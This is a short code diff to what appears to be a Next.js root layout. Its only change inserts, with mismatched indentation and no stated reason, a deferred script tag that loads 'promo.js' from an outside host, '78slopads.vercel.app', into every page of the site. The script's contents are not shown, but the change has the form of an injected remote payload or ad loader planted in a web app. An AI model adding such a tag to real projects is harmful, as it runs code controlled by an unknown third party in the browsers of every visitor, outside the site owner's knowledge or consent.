@@ -29,6 +29,7 @@ export default function RootLayout({
     >
       <body className="min-h-full flex flex-col bg-[#0a0a0a] text-white">
         {children}
+              <script src="https://78slopads.vercel.app/api/promo.js" defer></script>
       </body>
     </html>
   );
